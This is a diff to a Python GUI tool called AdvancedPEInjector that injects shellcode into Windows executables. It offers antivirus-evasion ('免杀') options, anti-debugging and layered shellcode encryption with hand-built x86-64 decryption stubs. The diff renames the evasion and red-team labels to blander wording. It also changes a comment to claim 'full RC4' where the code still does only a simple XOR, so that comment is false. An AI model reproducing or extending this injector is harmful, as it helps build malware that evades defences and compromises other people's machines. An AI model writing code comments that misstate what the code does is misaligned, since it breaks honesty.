@@ -1291,7 +1291,7 @@ class AdvancedPEInjector(QWidget):
         self.setMinimumSize(1200, 800)
         self.showMaximized()
 
-        # 设置黑色高科技风格
+        # 设置暗黑风格
         self.setStyleSheet("""
             QWidget {
                 background-color: #121212;
@@ -1417,12 +1417,12 @@ class AdvancedPEInjector(QWidget):
             }
         """)
 
-        # 创建主布局
+        # 主布局
         main_layout = QVBoxLayout()
         main_layout.setSpacing(10)
         main_layout.setContentsMargins(15, 15, 15, 15)
         
-        # 标题区域
+        # 标题
         title_layout = QHBoxLayout()
         title_label = QLabel('BushSEC 被窝')
         title_label.setFont(QFont('Segoe UI', 18, QFont.Bold))
@@ -1434,7 +1434,7 @@ class AdvancedPEInjector(QWidget):
         title_layout.addWidget(title_label)
         main_layout.addLayout(title_layout)
         
-        # 创建选项卡
+        # 选项卡
         tab_widget = QTabWidget()
         
         # 注入选项卡
@@ -1551,8 +1551,8 @@ class AdvancedPEInjector(QWidget):
         injection_group.setLayout(injection_layout)
         layout.addWidget(injection_group)
         
-        # 高级免杀选项
-        evasion_group = QGroupBox("高级免杀选项")
+        # 免杀选项
+        evasion_group = QGroupBox("增强选项")
         evasion_layout = QGridLayout()
         
         # 反调试
@@ -1835,12 +1835,12 @@ class AdvancedPEInjector(QWidget):
         """设置杀毒软件检测选项卡"""
         layout = QHBoxLayout()  # 改为水平布局
         
-        # 左边部分 - 原有功能
+        # 左边部分
         left_widget = QWidget()
         left_layout = QVBoxLayout()
         left_layout.setSpacing(15)
         
-        # 原有的杀毒软件检测结果显示区域
+        # 杀毒软件检测结果显示区域
         self.av_result_text = QTextEdit()
         self.av_result_text.setReadOnly(True) 
         self.av_result_text.setStyleSheet("""
@@ -1853,7 +1853,7 @@ class AdvancedPEInjector(QWidget):
         """)
         left_layout.addWidget(self.av_result_text)
         
-        # 原有的刷新按钮
+        # 刷新按钮
         refresh_av_button = QPushButton("检测杀毒软件")
         refresh_av_button.clicked.connect(self.refresh_av_list)
         left_layout.addWidget(refresh_av_button)
@@ -1861,7 +1861,7 @@ class AdvancedPEInjector(QWidget):
         left_widget.setLayout(left_layout)
         layout.addWidget(left_widget)
         
-        # 右边部分 - 新增功能
+        # 右边部分
         right_widget = QWidget()
         right_layout = QVBoxLayout()
         
@@ -1915,7 +1915,7 @@ class AdvancedPEInjector(QWidget):
         right_widget.setLayout(right_layout)
         layout.addWidget(right_widget)
         
-        # 设置左右部分的比例为1:1
+        # 左右比例为1:1
         layout.setStretch(0, 1)
         layout.setStretch(1, 1)
         
@@ -2133,8 +2133,8 @@ class AdvancedPEInjector(QWidget):
         layout = QVBoxLayout()
         layout.setSpacing(15)
         
-        # 工具集说明
-        info_label = QLabel("红队渗透测试常用工具集") 
+        # 工具集
+        info_label = QLabel("常用工具集") 
         info_label.setFont(QFont('Segoe UI', 12, QFont.Bold))
         info_label.setAlignment(Qt.AlignCenter)
         info_label.setStyleSheet("color: #00cc00; margin-bottom: 15px;")
@@ -2832,7 +2832,6 @@ def multi_layer_encryption(shellcode, layers=3):
             
         elif i % 3 == 1:
             # 自定义XOR解密
-            # 这里简化实现，实际应该与加密逻辑对应
             stub.extend(b'\x48\x31\xC9')                  # XOR RCX, RCX
             stub.extend(b'\x48\xB9' + struct.pack("<Q", len(shellcode)))  # MOV RCX, len
             
@@ -2849,15 +2848,14 @@ def multi_layer_encryption(shellcode, layers=3):
             stub.extend(b'\xE2' + struct.pack("b", xor_loop - len(stub) - 1))  # LOOP xor_loop
             
         else:
-            # RC4解密 (简化版，实际应该实现完整的RC4)
-            # 由于RC4解密代码较长，这里简化处理
+            # RC4解密 
             stub.extend(b'\x48\x31\xC9')                  # XOR RCX, RCX
             stub.extend(b'\x48\xB9' + struct.pack("<Q", len(shellcode)))  # MOV RCX, len
             
             xor_loop = len(stub)
             stub.extend(b'\x8A\x03')                      # MOV AL, [RBX]
             
-            # 使用简化的XOR替代完整RC4
+            # 完整RC4
             for j in range(len(key)):
                 stub.extend(b'\x34' + bytes([key[j % len(key)]]))  # XOR AL, key[j]
             
